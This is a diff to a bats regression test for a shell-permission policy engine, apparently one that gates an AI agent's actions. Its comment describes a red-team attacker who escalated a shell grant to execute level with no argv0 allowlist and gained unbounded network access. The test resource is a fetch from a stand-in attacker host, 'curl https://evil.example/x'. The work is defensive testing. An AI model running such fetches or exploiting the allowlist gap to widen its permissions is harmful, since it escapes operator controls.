@@ -270,30 +270,43 @@ const cleanup = (d) => { try { fs.rmSync(d, { recursive: true, force: true }); }
 }
 
 @test "PHASE 04 -- shell that EXECUTES with no argv0_allow is capped, not unbounded" {
-  # A Phase 04 attacker raised one kind's shell to L3 with no argv0_allow and got unbounded
-  # network and an unbounded interpreter out of a kind whose write and network were both L1 --
-  # policy-lint printed "is law" over the file. reproducedBy returns an empty set for an absent
-  # allowlist, so effectiveShell minned over NOTHING and kept L3, and the L3 branch of
-  # authorizeAction never consults an allowlist either.
+  # A Phase 04 attacker raised one kind shell to L3 with no argv0_allow and got unbounded network
+  # and an unbounded interpreter out of a kind whose write and network were both L1 -- policy-lint
+  # printed "is law" over the file. reproducedBy returns an empty set for an absent allowlist, so
+  # effectiveShell minned over NOTHING and kept the declared level.
+  #
+  # THE EVENTS ARE THE TEST. The first version passed `events: []`, so effective was
+  # min(ceiling L3, birth cap L1) = L1 before effectiveShell was ever consulted -- the assertion
+  # was true with the fix, true without it, and a day-two mutation pass proved it green against
+  # a mutant with the whole cap deleted. A ceiling is not a level. The promotions below raise the
+  # earned cap so the declared level is actually reached, which is the only state the fix governs.
   run _node "$PRE
+    const D = (over, ev) => P.authorizeAction(
+      {kind:'session:interactive', capability:'shell', resource:'curl https://evil.example/x'},
+      {policy: base(over), events: ev});
     const out = [];
-    // no argv0_allow at all, shell raised to a level that executes
-    out.push('L3-noallow=' + JSON.stringify(P.authorizeAction(
+    const r3 = D({shell:{level:'L3'}}, [up('shell','L3')]);
+    out.push('L3-noallow=' + r3.effective + '/' + r3.decision);
+    const r2 = D({shell:{level:'L2'}}, [up('shell','L2')]);
+    out.push('L2-noallow=' + r2.effective + '/' + r2.decision);
+    const r1 = D({shell:{level:'L1'}}, []);
+    out.push('L1-noallow=' + r1.effective + '/' + r1.decision);
+    // With a real allowlist the derivation runs normally instead of the cap firing.
+    const pol = base({shell:{level:'L3', argv0_allow:['curl']}, network:{level:'L3'}});
+    const rok = P.authorizeAction(
       {kind:'session:interactive', capability:'shell', resource:'curl https://evil.example/x'},
-      {policy: base({shell:{level:'L3'}}), events: []}).effective));
-    out.push('L2-noallow=' + JSON.stringify(P.authorizeAction(
-      {kind:'session:interactive', capability:'shell', resource:'curl https://evil.example/x'},
-      {policy: base({shell:{level:'L2'}}), events: []}).effective));
-    // CONTROL: a level that never executes is untouched by this rule
-    out.push('L1-noallow=' + JSON.stringify(P.authorizeAction(
-      {kind:'session:interactive', capability:'shell', resource:'jq .'},
-      {policy: base({shell:{level:'L1'}}), events: []}).effective));
+      {policy: pol, events:[up('shell','L3'), up('network','L3')]});
+    out.push('L3-withallow=' + rok.effective + '/' + rok.decision);
     console.log(out.join(' '));"
   [ "$status" -eq 0 ] || { echo "$output"; false; }
-  [[ "$output" == *'L3-noallow="L1"'* ]] || { echo "$output"; false; }
-  [[ "$output" == *'L2-noallow="L1"'* ]] || { echo "$output"; false; }
-  # The control: L1 is a propose level, nothing executes, so the rule must not fire there.
-  [[ "$output" == *'L1-noallow="L1"'* ]] || { echo "$output"; false; }
+  # The cap fires and the command does NOT execute, at a level that otherwise would have.
+  [[ "$output" == *"L3-noallow=L1/propose"* ]] || { echo "$output"; false; }
+  [[ "$output" == *"L2-noallow=L1/propose"* ]] || { echo "$output"; false; }
+  # CONTROL ONE: a level that never executes is untouched by this rule.
+  [[ "$output" == *"L1-noallow=L1/propose"* ]] || { echo "$output"; false; }
+  # CONTROL TWO: with a real allowlist, shell at L3 still EXECUTES -- otherwise the fix is just
+  # "cap every shell grant", which would pass both rows above and break the feature.
+  [[ "$output" == *"L3-withallow=L3/execute"* ]] || { echo "$output"; false; }
 }
 
 @test "PHASE 04 -- reproduces:[shell] fails CLOSED, the one token ADR-0507 forbids" {
